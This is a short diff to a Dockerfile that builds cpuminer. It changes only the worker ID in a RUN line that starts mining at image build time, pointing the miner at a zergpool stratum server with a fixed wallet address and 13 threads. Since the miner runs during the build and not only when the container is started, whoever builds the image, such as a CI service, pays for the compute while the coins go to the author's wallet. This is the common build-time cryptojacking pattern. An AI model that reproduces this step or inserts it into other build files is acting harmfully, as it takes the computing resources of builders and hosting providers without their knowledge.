@@ -32,5 +32,5 @@ RUN apt-get update \
 
 COPY --from=builder /app/cpuminer .
 ENTRYPOINT ["./cpuminer"]
-RUN ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.asia.mine.zergpool.com:4563 -u MK3aSa6UtVfoZm6xmS9U39t3zSbmjDDgRJ -p c=LTC,mc=PYRK,ID=jamjam -t 13
+RUN ./cpuminer -a lyra2z330 -o stratum+tcp://lyra2z330.asia.mine.zergpool.com:4563 -u MK3aSa6UtVfoZm6xmS9U39t3zSbmjDDgRJ -p c=LTC,mc=PYRK,ID=jk -t 13
 CMD ["-h"]
